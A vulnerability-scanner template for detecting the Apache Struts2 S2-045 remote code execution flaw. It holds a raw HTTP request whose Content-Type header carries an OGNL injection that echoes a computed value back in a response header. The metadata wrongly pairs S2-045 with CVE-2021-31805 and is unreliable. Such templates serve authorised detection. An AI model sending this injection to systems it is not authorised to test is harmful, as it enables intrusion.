id: poc-yaml-struts2-045
info:
  name: Apache struts S2-045 远程代码执行漏洞（CVE-2021-31805）
  severity: critical
  tags:
  - 两高一弱
  - rce
  - CVE-2021-31805
  finger: struts
variables:
  v1: random_int(1, 1000)
  v2: random_int(1, 1000)
requests:
- raw: 'POST / HTTP/1.1

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    Accept-Language: en-US,en;q=0.8,es;q=0.6

    Content-Length: 0

    Content-Type: %{#context[''com.opensymphony.xwork2.dispatcher.HttpServletResponse''].addHeader(''X-header-date'',{{.v1}}*{{.v2}})}.multipart/form-data'
  expression: contains(headers, str(v1*v2))  && contains(headers, "X-header-date")
transport: http
